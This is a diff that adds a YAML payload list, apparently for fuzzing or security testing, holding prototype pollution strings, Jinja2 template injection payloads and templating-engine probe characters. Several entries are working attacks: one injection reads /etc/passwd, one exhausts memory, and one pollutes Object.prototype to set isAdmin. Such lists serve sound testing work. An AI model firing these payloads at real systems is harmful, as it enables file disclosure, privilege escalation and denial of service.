@@ -1,0 +1,42 @@
+data:
+  - id: prototypePollution
+    description: Common JS prototype pollution
+    values:
+      - "Object.__proto__[\"evilProperty\"]=\"evilPayload\""
+      - "Object.__proto__.evilProperty=\"evilPayload\""
+      - "Object.constructor.prototype.evilProperty=\"evilPayload\""
+      - "Object.constructor[\"prototype\"][\"evilProperty\"]=\"evilPayload\""
+      - "{\"__proto__\": {\"evilProperty\": \"evilPayload\"}}"
+      - "Object.prototype.isAdmin = true;"
+
+  - id: jinja2Injection
+    description: Jinja2 template injection
+    values:
+      - "{% print 'x' * 64 * 1024**3 %}"
+      - "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}"
+
+  - id: templatingEngineStrings
+    description: Templating engine strings
+    values:
+      - "{{"
+      - "}}"
+      - "{{}}"
+      - "{{7*7}}"
+      - "$"
+      - "<%"
+      - "%>"
+      - "'"
+      - "\""
+      - "%"
+      - "%\\"
+      - "\\"
+      - "%{{<%[%'\"}}%\\"
+      - "[%"
+      - "%]"
+      - "<tag>"
+      - "<%="
+      - "=%>"
+      - "<%=foobar%>"
+      - "a{*"
+      - "*}b"
+      - "a{*comment*}b"
